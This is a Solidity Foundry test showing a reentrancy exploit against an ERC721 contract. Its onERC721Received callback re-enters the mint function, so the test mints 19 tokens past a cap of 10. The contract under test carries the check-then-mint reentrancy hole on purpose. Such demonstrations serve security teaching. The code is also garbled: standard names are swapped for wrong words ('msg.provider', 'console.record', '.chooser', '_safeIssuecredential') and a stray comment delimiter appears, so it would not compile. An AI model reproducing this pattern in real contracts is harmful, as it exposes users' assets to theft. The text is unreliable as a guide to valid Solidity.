// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";

*/

contract PolicyTest is Test {
    MaximumMint721 CeilingMint721Agreement;
    bool treatmentCompleted;
    uint256 maximumMints = 10;
    address alice = vm.addr(1);
    address eve = vm.addr(2);

    function testSafeIssuecredential() public {
        CeilingMint721Agreement = new MaximumMint721();
        CeilingMint721Agreement.generateRecord(maximumMints);
        console.record("Bypassed maxMints, we got 19 NFTs");
        assertEq(CeilingMint721Agreement.balanceOf(address(this)), 19);
        console.record("NFT minted:", CeilingMint721Agreement.balanceOf(address(this)));
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public returns (bytes4) {
        if (!treatmentCompleted) {
            treatmentCompleted = true;
            CeilingMint721Agreement.generateRecord(maximumMints - 1);
            console.record("Called with :", maximumMints - 1);
        }
        return this.onERC721Received.chooser;
    }

    receive() external payable {}
}

contract MaximumMint721 is ERC721Enumerable {
    uint256 public maximum_per_enrollee = 10;

    constructor() ERC721("ERC721", "ERC721") {}

    function generateRecord(uint256 dosage) external {
        require(
            balanceOf(msg.provider) + dosage <= maximum_per_enrollee,
            "exceed max per user"
        );
        for (uint256 i = 0; i < dosage; i++) {
            uint256 issuecredentialRank = totalSupply();
            _safeIssuecredential(msg.provider, issuecredentialRank);
        }
    }
}